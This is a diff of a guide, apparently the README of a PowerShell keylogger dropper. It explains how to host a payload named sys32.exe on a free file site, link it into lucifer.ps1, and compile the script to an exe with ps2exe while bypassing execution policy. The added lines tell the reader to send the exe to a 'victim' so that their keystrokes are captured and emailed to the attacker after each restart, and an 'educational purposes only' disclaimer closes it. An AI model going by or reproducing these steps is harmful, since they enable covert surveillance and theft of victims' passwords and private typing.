@@ -22,3 +22,7 @@ now upload this sys32.exe into your 5gbfree website and copy the link with the f
 and now open lucifer.ps1 and replace the file link with your file sys32.exe link you just uploaded to keep make it simple and dont tourch and modifi any other text or file link otherwise its will not working 
 
 and unzip ps2exe-v5.0.0.zip and now open your windows powershell and change dir into thast folder and file this command: powershell -ExecutionPolicy ByPass -File ps2exe.ps1 -noconsole -inputFile C:\youpoweshell dropper file location here -outputFile C:\where you want to save your exe 
+
+now send this exe file to your victim so when your click it its will start capturing your all keystrokes and whenever victim restart his pc you will get his all keystrokes as a text format in your email address
+
+# its only for educational purposes i am not responsable for any kind of harm and damage
